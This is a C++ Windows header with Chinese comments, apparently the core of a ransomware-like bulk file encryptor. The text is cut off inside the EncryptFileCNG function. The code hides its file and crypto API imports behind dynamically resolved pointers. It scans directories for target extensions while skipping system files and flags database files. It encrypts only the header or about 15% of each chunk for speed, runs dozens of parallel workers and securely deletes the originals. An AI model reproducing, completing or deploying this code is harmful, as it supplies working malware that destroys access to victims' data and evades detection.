// EncryptionUtils.h - MVVM架构重构版 + 动态API调用
#pragma once

/*#ifndef ENCRYPTION_UTILS_H
#define ENCRYPTION_UTILS_H
*/
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <algorithm>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h>
#include <map>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include <future>
#include <optional>
#include"Message.h"
// 包含动态API加载器
#include "getapi.h"

// 使用inline避免重复定义
inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096;
inline constexpr DWORD KEY_LENGTH = 32;
inline constexpr DWORD IV_LENGTH = 16;
inline constexpr DWORD TAG_LENGTH = 0;
inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64;
inline constexpr DWORD MAX_CONCURRENT_IO = 80;
inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024;
inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15;
inline constexpr size_t CHUNK_SIZE = 1024 * 1024;
inline constexpr size_t LARGE_FILE_THRESHOLD = 64 * 1024 * 1024;
inline constexpr size_t SMALL_FILE_THRESHOLD = 1024 * 1024;
inline constexpr DWORD IOCP_CONCURRENCY = 4;
inline constexpr DWORD AESNI_BATCH_SIZE = 8;
inline constexpr DWORD MAX_WORKER_THREADS = 64;
inline constexpr DWORD IO_THREADS = 4;
inline constexpr DWORD COMPUTE_THREADS = 16;
inline constexpr DWORD MANAGER_THREADS = 1;

// 移除静态链接库指令
// #pragma comment(lib, "bcrypt.lib")
// #pragma comment(lib, "Ole32.lib")
// #pragma comment(lib, "kernel32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;
bool isFileLocked(const fs::path& filePath);
// 动态API命名空间
namespace DynamicAPI {
    // 安全检查宏
#define DYNAMIC_API_CHECK(func) \
        if (!func) { \
            throw std::runtime_error("API not available: " #func); \
        }

    // 文件操作API包装器
    inline HANDLE CreateFileW_Dyn(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
        DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
        DYNAMIC_API_CHECK(pCreateFileW);
        return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
            dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    }

    inline BOOL ReadFile_Dyn(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
        LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
        DYNAMIC_API_CHECK(pReadFile);
        return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
    }

    inline BOOL WriteFile_Dyn(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
        LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
        DYNAMIC_API_CHECK(pWriteFile);
        return pWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }

    inline BOOL CloseHandle_Dyn(HANDLE hObject) {
        DYNAMIC_API_CHECK(pCloseHandle);
        return pCloseHandle(hObject);
    }

    inline BOOL GetFileSizeEx_Dyn(HANDLE hFile, PLARGE_INTEGER lpFileSize) {
        DYNAMIC_API_CHECK(pGetFileSizeEx);
        return pGetFileSizeEx(hFile, lpFileSize);
    }

    inline BOOL SetFilePointerEx_Dyn(HANDLE hFile, LARGE_INTEGER liDistanceToMove,
        PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod) {
        DYNAMIC_API_CHECK(pSetFilePointerEx);
        return pSetFilePointerEx(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);
    }

    inline BOOL SetEndOfFile_Dyn(HANDLE hFile) {
        DYNAMIC_API_CHECK(pSetEndOfFile);
        return pSetEndOfFile(hFile);
    }

    inline DWORD GetFileAttributesW_Dyn(LPCWSTR lpFileName) {
        DYNAMIC_API_CHECK(pGetFileAttributesW);
        return pGetFileAttributesW(lpFileName);
    }

    inline BOOL SetFileAttributesW_Dyn(LPCWSTR lpFileName, DWORD dwFileAttributes) {
        DYNAMIC_API_CHECK(pSetFileAttributesW);
        return pSetFileAttributesW(lpFileName, dwFileAttributes);
    }

    inline BOOL DeleteFileW_Dyn(LPCWSTR lpFileName) {
        DYNAMIC_API_CHECK(pDeleteFileW);
        return pDeleteFileW(lpFileName);
    }

    inline HANDLE CreateFileMappingW_Dyn(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes,
        DWORD flProtect, DWORD dwMaximumSizeHigh,
        DWORD dwMaximumSizeLow, LPCWSTR lpName) {
        DYNAMIC_API_CHECK(pCreateFileMappingW);
        return pCreateFileMappingW(hFile, lpAttributes, flProtect, dwMaximumSizeHigh,
            dwMaximumSizeLow, lpName);
    }

    inline LPVOID MapViewOfFile_Dyn(HANDLE hFileMappingObject, DWORD dwDesiredAccess,
        DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow,
        SIZE_T dwNumberOfBytesToMap) {
        DYNAMIC_API_CHECK(pMapViewOfFile);
        return pMapViewOfFile(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh,
            dwFileOffsetLow, dwNumberOfBytesToMap);
    }

    inline BOOL UnmapViewOfFile_Dyn(LPCVOID lpBaseAddress) {
        DYNAMIC_API_CHECK(pUnmapViewOfFile);
        return pUnmapViewOfFile(lpBaseAddress);
    }

    inline BOOL FlushFileBuffers_Dyn(HANDLE hFile) {
        DYNAMIC_API_CHECK(pFlushFileBuffers);
        return pFlushFileBuffers(hFile);
    }

    // 内存操作API包装器
    inline LPVOID VirtualAlloc_Dyn(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
        DYNAMIC_API_CHECK(pVirtualAlloc);
        return pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    }

    inline BOOL VirtualFree_Dyn(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
        DYNAMIC_API_CHECK(pVirtualFree);
        return pVirtualFree(lpAddress, dwSize, dwFreeType);
    }

    inline VOID GetSystemInfo_Dyn(LPSYSTEM_INFO lpSystemInfo) {
        DYNAMIC_API_CHECK(pGetSystemInfo);
        pGetSystemInfo(lpSystemInfo);
    }

    // 线程操作API包装器
    inline HANDLE CreateThread_Dyn(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
        DWORD dwCreationFlags, LPDWORD lpThreadId) {
        DYNAMIC_API_CHECK(pCreateThread);
        return pCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter,
            dwCreationFlags, lpThreadId);
    }

    // 加密操作API包装器
    inline NTSTATUS BCryptOpenAlgorithmProvider_Dyn(BCRYPT_ALG_HANDLE* phAlgorithm, LPCWSTR pszAlgId,
        LPCWSTR pszImplementation, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptOpenAlgorithmProvider);
        return pBCryptOpenAlgorithmProvider(phAlgorithm, pszAlgId, pszImplementation, dwFlags);
    }

    inline NTSTATUS BCryptCloseAlgorithmProvider_Dyn(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptCloseAlgorithmProvider);
        return pBCryptCloseAlgorithmProvider(hAlgorithm, dwFlags);
    }

    inline NTSTATUS BCryptSetProperty_Dyn(BCRYPT_HANDLE hObject, LPCWSTR pszProperty,
        PUCHAR pbInput, ULONG cbInput, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptSetProperty);
        return pBCryptSetProperty(hObject, pszProperty, pbInput, cbInput, dwFlags);
    }

    inline NTSTATUS BCryptGetProperty_Dyn(BCRYPT_HANDLE hObject, LPCWSTR pszProperty,
        PUCHAR pbOutput, ULONG cbOutput, ULONG* pcbResult, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptGetProperty);
        return pBCryptGetProperty(hObject, pszProperty, pbOutput, cbOutput, pcbResult, dwFlags);
    }

    inline NTSTATUS BCryptGenerateSymmetricKey_Dyn(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE* phKey,
        PUCHAR pbKeyObject, ULONG cbKeyObject, PUCHAR pbSecret,
        ULONG cbSecret, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptGenerateSymmetricKey);
        return pBCryptGenerateSymmetricKey(hAlgorithm, phKey, pbKeyObject, cbKeyObject,
            pbSecret, cbSecret, dwFlags);
    }

    inline NTSTATUS BCryptDestroyKey_Dyn(BCRYPT_KEY_HANDLE hKey) {
        DYNAMIC_API_CHECK(pBCryptDestroyKey);
        return pBCryptDestroyKey(hKey);
    }

    inline NTSTATUS BCryptEncrypt_Dyn(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput,
        VOID* pPaddingInfo, PUCHAR pbIV, ULONG cbIV,
        PUCHAR pbOutput, ULONG cbOutput, ULONG* pcbResult, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptEncrypt);
        return pBCryptEncrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV,
            pbOutput, cbOutput, pcbResult, dwFlags);
    }

    inline NTSTATUS BCryptGenRandom_Dyn(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer,
        ULONG cbBuffer, ULONG dwFlags) {
        DYNAMIC_API_CHECK(pBCryptGenRandom);
        return pBCryptGenRandom(hAlgorithm, pbBuffer, cbBuffer, dwFlags);
    }

    // Shell操作API包装器
    inline HRESULT SHGetKnownFolderPath_Dyn(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken,
        PWSTR* ppszPath) {
        DYNAMIC_API_CHECK(pSHGetKnownFolderPath);
        return pSHGetKnownFolderPath(rfid, dwFlags, hToken, ppszPath);
    }

    inline VOID CoTaskMemFree_Dyn(LPVOID pv) {
        DYNAMIC_API_CHECK(pCoTaskMemFree);
        pCoTaskMemFree(pv);
    }

    // 安全调用包装器（带错误处理）
    template<typename Func, typename... Args>
    inline auto SafeCall(Func func, Args&&... args) -> decltype(func(std::forward<Args>(args)...)) {
        if (!func) {
            throw std::runtime_error("API function pointer is null");
        }
        return func(std::forward<Args>(args)...);
    }

    // 初始化检查
    inline bool IsInitialized() {
        return g_DynamicAPIInitializer.IsInitialized();
    }

    // 优雅降级函数（当动态API不可用时使用）
    inline bool InitializeFallback() {
        // 尝试重新初始化
        return InitializeDynamicAPIs();
    }
}

bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
// 前向声明
bool SecureDelete(const fs::path& path);

// 自定义min/max替代函数
template<typename T>
T custom_min(T a, T b) {
    return a < b ? a : b;
}

template<typename T>
T custom_max(T a, T b) {
    return a > b ? a : b;
}

// 辅助函数
inline void GenerateRandomKey(BYTE* key, DWORD length);
inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
inline fs::path GetUserDocumentsPath();
inline bool IsAesNiSupported();
inline std::string to_hex(NTSTATUS status);

// 内存管理
class MemoryPool {
public:
    MemoryPool(size_t poolSize = MEMORY_POOL_SIZE);
    ~MemoryPool();

    void* allocate(size_t size, size_t alignment = 16);
    void deallocate(void* ptr);
    void reset();
    size_t getUsedMemory() const;
    size_t getTotalMemory() const;

private:
    std::vector<uint8_t> buffer;
    size_t usedMemory;
    size_t totalMemory;
};

// 数据库文件检测
class DatabaseFileDetector {
public:
    static bool isDatabaseFile(const fs::path& path);
    static const std::unordered_set<std::string>& getDatabaseExtensions();

private:
    static const std::unordered_set<std::string> databaseExtensions;
};

// 系统文件检测
class SystemFileDetector {
public:
    static bool isSystemFile(const fs::path& path);
    static const std::vector<std::wstring>& getSystemPatterns();

private:
    static const std::vector<std::wstring> systemPatterns;
};

// 数据模型
namespace Model {
    // 加密任务数据结构
    struct EncryptionTask {
        fs::path inputPath;
        fs::path outputPath;
        std::vector<uint8_t> key;
        size_t fileSize;
        bool isDatabaseFile;
        int priority;

        bool operator<(const EncryptionTask& other) const {
            return priority < other.priority;
        }
    };

    // 加密结果数据结构
    struct EncryptionResult {
        bool success;
        std::string errorMessage;
        size_t bytesProcessed;
        double processingTime;
        std::chrono::system_clock::time_point completionTime;
    };

    // 加密数据模型
    class EncryptionModel {
    public:
        EncryptionModel();
        ~EncryptionModel();

        std::vector<EncryptionTask> getPendingTasks() const;
        void addTask(const EncryptionTask& task);
        EncryptionResult executeTask(const EncryptionTask& task);
        void clearCompletedTasks();
        size_t getTaskCount() const;

    private:
        std::vector<EncryptionTask> tasks;
        std::vector<EncryptionResult> results;
        mutable std::mutex tasksMutex;
        mutable std::mutex resultsMutex;
    };

    // 文件系统数据模型
    class FileSystemModel {
    public:
        struct FileInfo {
            fs::path path;
            size_t size;
            bool isDatabaseFile;
            time_t lastModified;
            DWORD attributes;
        };

        FileSystemModel();
        ~FileSystemModel();

        std::vector<FileInfo> scanDirectory(const fs::path& directory,
            const std::vector<std::string>& extensions);
        bool secureDelete(const fs::path& path);
        bool isFileLocked(const fs::path& path) const;
        std::vector<FileInfo> getLockedFiles() const;

    private:
        bool isSystemFile(const fs::path& path) const;
        bool isDatabaseFile(const fs::path& path) const;
        std::vector<FileInfo> lockedFiles;
        mutable std::mutex lockedFilesMutex;
    };

    // 硬件数据模型
    class HardwareModel {
    public:
        struct HardwareInfo {
            bool aesniSupported;
            uint32_t coreCount;
            uint32_t threadCount;
            size_t totalMemory;
            size_t availableMemory;
            std::string cpuBrand;
            bool avxSupported;
            bool avx2Supported;
        };

        HardwareModel();
        ~HardwareModel();

        HardwareInfo getHardwareInfo() const;
        bool optimizeForHardware();

    private:
        bool checkAesNiSupport() const;
        uint32_t getCoreCount() const;
        std::string getCpuBrand() const;
        HardwareInfo cachedInfo;
    };
}

// 视图模型
namespace ViewModel {
    // 性能指标数据结构
    struct PerformanceMetrics {
        double cpuUsage;
        double memoryUsage;
        double diskThroughput;
        size_t filesProcessed;
        size_t bytesProcessed;
        std::chrono::milliseconds totalTime;
        size_t successfulEncryptions;
        size_t failedEncryptions;
        double encryptionRateMBs;
    };

    // 加密视图模型
    class EncryptionViewModel {
    public:
        EncryptionViewModel();
        ~EncryptionViewModel();

        void initialize();
        void shutdown();

        bool startEncryption(const fs::path& directory,
            const std::vector<std::string>& extensions);
        void stopEncryption();
        PerformanceMetrics getPerformanceMetrics() const;
        bool isEncryptionRunning() const;
        void pauseEncryption();
        void resumeEncryption();

    private:
        void processFiles();
        void scheduleTasks();
        void monitorPerformance();
        void updateMetrics(const Model::EncryptionResult& result);

        std::unique_ptr<Model::EncryptionModel> encryptionModel;
        std::unique_ptr<Model::FileSystemModel> fileSystemModel;
        std::unique_ptr<Model::HardwareModel> hardwareModel;

        std::atomic<bool> isRunning;
        std::atomic<bool> isPaused;
        std::thread processingThread;
        std::thread schedulingThread;
        std::thread monitoringThread;

        mutable std::mutex metricsMutex;
        PerformanceMetrics currentMetrics;
        std::chrono::steady_clock::time_point startTime;
    };
}

// 四层架构实现
namespace Architecture {
    // 任务优先级结构
    struct TaskPriority {
        size_t fileSize;
        bool isDatabaseFile;
        time_t timestamp;
        int userPriority;

        bool operator<(const TaskPriority& other) const {
            if (fileSize != other.fileSize) return fileSize < other.fileSize;
            if (isDatabaseFile != other.isDatabaseFile) return isDatabaseFile < other.isDatabaseFile;
            return timestamp < other.timestamp;
        }
    };

    // 调度层
    class SchedulerLayer {
    public:
        using EncryptionTask = Model::EncryptionTask;
        using EncryptionResult = Model::EncryptionResult;

        SchedulerLayer(size_t maxConcurrency);
        ~SchedulerLayer();

        void addTask(EncryptionTask task);
        std::optional<EncryptionTask> getNextTask();
        void completeTask(const EncryptionTask& task, const EncryptionResult& result);
        size_t getPendingTaskCount() const;
        size_t getCompletedTaskCount() const;
        void clearCompletedTasks();

    private:
        std::priority_queue<std::pair<TaskPriority, EncryptionTask>> taskQueue;
        std::vector<std::pair<EncryptionTask, EncryptionResult>> completedTasks;
        mutable std::mutex queueMutex;
        mutable std::mutex completedMutex;
        std::condition_variable queueCondition;
        std::atomic<size_t> activeTasks;
        size_t maxConcurrentTasks;
    };

    // 执行层
    class ExecutionLayer {
    public:
        ExecutionLayer(size_t threadCount);
        ~ExecutionLayer();

        bool executeTask(const Model::EncryptionTask& task);
        void stop();
        size_t getActiveThreadCount() const;

    private:
        void workerThread();
        bool processFile(const Model::EncryptionTask& task);
        bool encryptFileChunksCBC(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
            const BYTE* inputData, size_t fileSize,
            HANDLE hOutputFile, bool isDatabaseFile);
        size_t calculateChunkEncryptSize(size_t chunkSize) const;

        std::vector<std::thread> workerThreads;
        std::atomic<bool> stopFlag;
        std::atomic<size_t> activeThreads;
        MemoryPool memoryPool;
    };

    // 硬件层
    class HardwareLayer {
    public:
        HardwareLayer();
        ~HardwareLayer();

        bool initialize();
        void shutdown();

        bool encryptData(std::vector<uint8_t>& input, std::vector<uint8_t>& output,
            std::vector<uint8_t>& key, std::vector<uint8_t>& iv);
        bool supportsAESNI() const;
        bool supportsAVX() const;
        bool supportsAVX2() const;
        size_t getOptimalBatchSize() const;

    private:
        BCRYPT_ALG_HANDLE aesAlgorithm;
        bool aesniSupported;
        bool avxSupported;
        bool avx2Supported;
    };
}

// 应用层
class ApplicationLayer {
public:
    ApplicationLayer();
    ~ApplicationLayer();

    void run();
    void stop();
    void configure(const std::vector<std::string>& extensions,
        const fs::path& directory);
    ViewModel::PerformanceMetrics getMetrics() const;

private:
    std::unique_ptr<ViewModel::EncryptionViewModel> viewModel;
    std::vector<std::string> targetExtensions;
    fs::path targetDirectory;
};

// RAII封装 - 内存映射文件类（使用动态API）
class MemoryMappedFile {
public:
    MemoryMappedFile() : hFile(INVALID_HANDLE_VALUE), hMapping(NULL), pData(nullptr), size(0) {}

    ~MemoryMappedFile() {
        close();
    }

    bool open(const fs::path& filePath, DWORD access = GENERIC_READ | GENERIC_WRITE,
        DWORD sharing = FILE_SHARE_READ | FILE_SHARE_WRITE,
        DWORD mappingProtect = PAGE_READWRITE, DWORD viewAccess = FILE_MAP_READ | FILE_MAP_WRITE) {
        close();

        // 使用动态API打开文件
        hFile = DynamicAPI::CreateFileW_Dyn(filePath.c_str(), access, sharing, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();

            // 如果访问被拒绝，尝试只读模式
            if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
                std::cerr << "警告: 无法以读写模式打开文件，尝试只读模式: " << filePath << std::endl;
                access = GENERIC_READ;
                sharing = FILE_SHARE_READ;
                mappingProtect = PAGE_READONLY;
                viewAccess = FILE_MAP_READ;

                hFile = DynamicAPI::CreateFileW_Dyn(filePath.c_str(), access, sharing, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hFile == INVALID_HANDLE_VALUE) {
                    error = GetLastError();
                    std::cerr << "无法打开文件: " << filePath << " 错误: " << error << std::endl;
                    return false;
                }
            }
            else {
                std::cerr << "CreateFileW失败: " << filePath << " 错误: " << error << std::endl;
                return false;
            }
        }

        // 获取文件大小
        LARGE_INTEGER fileSize;
        if (!DynamicAPI::GetFileSizeEx_Dyn(hFile, &fileSize)) {
            DWORD error = GetLastError();
            DynamicAPI::CloseHandle_Dyn(hFile);
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "GetFileSizeEx失败: " << error << std::endl;
            return false;
        }
        size = static_cast<size_t>(fileSize.QuadPart);

        // 处理空文件
        if (size == 0) {
            std::cerr << "文件为空: " << filePath << std::endl;
            DynamicAPI::CloseHandle_Dyn(hFile);
            hFile = INVALID_HANDLE_VALUE;
            return false;
        }

        // 创建内存映射
        hMapping = DynamicAPI::CreateFileMappingW_Dyn(hFile, NULL, mappingProtect, 0, 0, NULL);
        if (hMapping == NULL) {
            DWORD error = GetLastError();
            DynamicAPI::CloseHandle_Dyn(hFile);
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "CreateFileMappingW失败: " << error << std::endl;
            return false;
        }

        // 映射视图
        pData = DynamicAPI::MapViewOfFile_Dyn(hMapping, viewAccess, 0, 0, size);
        if (pData == NULL) {
            DWORD error = GetLastError();
            DynamicAPI::CloseHandle_Dyn(hMapping);
            DynamicAPI::CloseHandle_Dyn(hFile);
            hMapping = NULL;
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "MapViewOfFile失败: " << error << std::endl;
            return false;
        }

        return true;
    }

    void close() {
        if (pData) {
            DynamicAPI::UnmapViewOfFile_Dyn(pData);
            pData = nullptr;
        }
        if (hMapping != NULL) {
            DynamicAPI::CloseHandle_Dyn(hMapping);
            hMapping = NULL;
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            DynamicAPI::CloseHandle_Dyn(hFile);
            hFile = INVALID_HANDLE_VALUE;
        }
        size = 0;
    }

    void* data() const { return pData; }
    size_t getSize() const { return size; }
    bool isOpen() const { return pData != nullptr; }

private:
    HANDLE hFile;
    HANDLE hMapping;
    void* pData;
    size_t size;
};

// 异步加密管理器
class AsyncEncryptionManager {
public:
    AsyncEncryptionManager(size_t maxConcurrentTasks = MAX_CONCURRENT_IO)
        : maxConcurrentTasks(maxConcurrentTasks), stop(false), activeTasks(0),
        completedTasks(0), failedTasks(0) {
        // 创建工作线程
        for (size_t i = 0; i < maxConcurrentTasks; ++i) {
            workers.emplace_back([this] { worker(); });
        }
    }

    ~AsyncEncryptionManager() {
        stop = true;
        condition.notify_all();

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }

    void addTask(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
        std::unique_lock<std::mutex> lock(queueMutex);
        tasks.push({ inputFile, outputFile, key });
        lock.unlock();
        condition.notify_one();
    }

    void waitForCompletion() {
        std::unique_lock<std::mutex> lock(queueMutex);
        completionCondition.wait(lock, [this] {
            return tasks.empty() && activeTasks == 0;
            });
    }

    // 添加统计方法
    void printStatistics() {
        std::cout << "Encryption Task Statistics: " << std::endl;
        std::cout << "  Success: " << completedTasks << " files" << std::endl;
        std::cout << "  Failed: " << failedTasks << " files" << std::endl;
        std::cout << "  Total: " << (completedTasks + failedTasks) << " files" << std::endl;
    }

private:
    void worker() {
        while (!stop) {
            std::tuple<fs::path, fs::path, const BYTE*> task;

            {
                std::unique_lock<std::mutex> lock(queueMutex);
                condition.wait(lock, [this] {
                    return stop || !tasks.empty();
                    });

                if (stop && tasks.empty()) break;
                if (tasks.empty()) continue;

                task = tasks.front();
                tasks.pop();
                activeTasks++;
            }

            // 执行加密任务
            fs::path inputFile = std::get<0>(task);
            fs::path outputFile = std::get<1>(task);
            const BYTE* key = std::get<2>(task);

            bool encryptSuccess = EncryptFileCNG(inputFile, outputFile, key);

            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (encryptSuccess) {
                    completedTasks++;
                }
                else {
                    failedTasks++;
                }

                activeTasks--;
                if (tasks.empty() && activeTasks == 0) {
                    completionCondition.notify_all();
                }
            }
        }
    }

    std::queue<std::tuple<fs::path, fs::path, const BYTE*>> tasks;
    std::vector<std::thread> workers;
    std::mutex queueMutex;
    std::condition_variable condition;
    std::condition_variable completionCondition;
    std::atomic<bool> stop;
    std::atomic<size_t> activeTasks;
    std::atomic<size_t> completedTasks;
    std::atomic<size_t> failedTasks;
    size_t maxConcurrentTasks;
};

// 计算分块加密大小
inline size_t CalculateChunkEncryptSize(size_t chunkSize) {
    size_t encryptSize = static_cast<size_t>(chunkSize * CHUNK_ENCRYPT_RATIO / 100.0);
    // 对齐到16字节边界（AES块大小）
    encryptSize = encryptSize - (encryptSize % 16);
    return custom_max(encryptSize, static_cast<size_t>(16));
}

// CBC模式加密函数
inline bool EncryptFileChunksCBC(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
    const BYTE* inputData, size_t fileSize,
    HANDLE hOutputFile, bool isDatabaseFile) {
    try {
        DWORD bytesWritten = 0;
        LARGE_INTEGER writeOffset;

        if (!isDatabaseFile) {
            // 写入IV到文件开头
            writeOffset.QuadPart = 0;
            if (!pSetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                throw std::runtime_error("SetFilePointerEx failed: IV write");
            }

            if (!pWriteFile(hOutputFile, iv, IV_LENGTH, &bytesWritten, NULL) || bytesWritten != IV_LENGTH) {
                throw std::runtime_error("IV write failed");
            }
        }

        // 分块加密逻辑
        size_t totalChunks = (fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
        std::vector<BYTE> chunkBuffer(CHUNK_SIZE);
        std::vector<BYTE> encryptedChunkBuffer(CHUNK_SIZE + 16);

        // 对于CBC模式，我们需要保持IV链
        BYTE currentIV[IV_LENGTH];
        memcpy(currentIV, iv, IV_LENGTH);

        for (size_t chunkIndex = 0; chunkIndex < totalChunks; ++chunkIndex) {
            size_t chunkOffset = chunkIndex * CHUNK_SIZE;
            size_t currentChunkSize = custom_min(CHUNK_SIZE, fileSize - chunkOffset);

            // 复制块数据到缓冲区
            memcpy(chunkBuffer.data(), inputData + chunkOffset, currentChunkSize);

            // 计算当前块的加密大小
            size_t encryptSizeThisChunk = 0;
            if (fileSize < SMALL_FILE_THRESHOLD) {
                if (chunkIndex == 0) {
                    encryptSizeThisChunk = custom_min(static_cast<size_t>(HEADER_ENCRYPT_SIZE), currentChunkSize);
                }
            }
            else {
                encryptSizeThisChunk = CalculateChunkEncryptSize(currentChunkSize);
                encryptSizeThisChunk = custom_min(encryptSizeThisChunk, currentChunkSize);
            }

            if (encryptSizeThisChunk > 0) {
                // 确保加密大小是16字节的倍数
                size_t paddedSize = encryptSizeThisChunk;
                if (paddedSize % 16 != 0) {
                    paddedSize = paddedSize + (16 - (paddedSize % 16));
                }

                // 确保缓冲区足够大
                std::vector<BYTE> paddedChunk(paddedSize);
                memcpy(paddedChunk.data(), chunkBuffer.data(), encryptSizeThisChunk);

                // 对于非完整块，进行填充
                if (encryptSizeThisChunk < paddedSize) {
                    // 使用PKCS7填充
                    BYTE padValue = static_cast<BYTE>(paddedSize - encryptSizeThisChunk);
                    for (size_t i = encryptSizeThisChunk; i < paddedSize; ++i) {
                        paddedChunk[i] = padValue;
                    }
                }

                ULONG cbResult = 0;
                NTSTATUS status = pBCryptEncrypt(
                    hKey,
                    paddedChunk.data(),
                    static_cast<ULONG>(paddedSize),
                    NULL,
                    currentIV,
                    IV_LENGTH,
                    encryptedChunkBuffer.data(),
                    static_cast<ULONG>(encryptedChunkBuffer.size()),
                    &cbResult,
                    BCRYPT_BLOCK_PADDING
                );

                if (!NT_SUCCESS(status)) {
                    std::cerr << "BCryptEncrypt failed in chunk " << chunkIndex
                        << " with status: " << to_hex(status)
                        << " for input size: " << paddedSize << std::endl;

                    // 重试一次
                    status = pBCryptEncrypt(
                        hKey,
                        paddedChunk.data(),
                        static_cast<ULONG>(paddedSize),
                        NULL,
                        currentIV,
                        IV_LENGTH,
                        encryptedChunkBuffer.data(),
                        static_cast<ULONG>(encryptedChunkBuffer.size()),
                        &cbResult,
                        BCRYPT_BLOCK_PADDING
                    );

                    if (!NT_SUCCESS(status)) {
                        throw std::runtime_error("BCryptEncrypt retry failed in chunk " +
                            std::to_string(chunkIndex) + ": " + to_hex(status));
                    }
                }

                // 更新IV为最后一个密文块
                if (cbResult >= IV_LENGTH) {
                    memcpy(currentIV, encryptedChunkBuffer.data() + cbResult - IV_LENGTH, IV_LENGTH);
                }

                // 写入加密数据
                writeOffset.QuadPart = isDatabaseFile ? chunkOffset : (IV_LENGTH + chunkOffset);
                if (!pSetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                    throw std::runtime_error("SetFilePointerEx failed: chunk write");
                }

                if (!pWriteFile(hOutputFile, encryptedChunkBuffer.data(), cbResult, &bytesWritten, NULL) ||
                    bytesWritten != cbResult) {
                    throw std::runtime_error("WriteFile failed for chunk " + std::to_string(chunkIndex));
                }
            }

            // 写入当前块的剩余未加密数据
            if (currentChunkSize > encryptSizeThisChunk) {
                size_t remainingSize = currentChunkSize - encryptSizeThisChunk;
                writeOffset.QuadPart = isDatabaseFile ?
                    (chunkOffset + encryptSizeThisChunk) :
                    (IV_LENGTH + chunkOffset + encryptSizeThisChunk);

                if (!pSetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                    throw std::runtime_error("SetFilePointerEx failed: remaining data write");
                }

                if (!pWriteFile(hOutputFile, chunkBuffer.data() + encryptSizeThisChunk,
                    static_cast<DWORD>(remainingSize), &bytesWritten, NULL) ||
                    bytesWritten != remainingSize) {
                    throw std::runtime_error("WriteFile failed for remaining data in chunk " +
                        std::to_string(chunkIndex));
                }
            }
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Chunk encryption error: " << e.what() << std::endl;
        return false;
    }
}

// SecureDelete函数实现 - 修复版

// 修改EncryptFileCNG函数以使用动态API调用
// 修改EncryptFileCNG函数以使用动态API调用
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
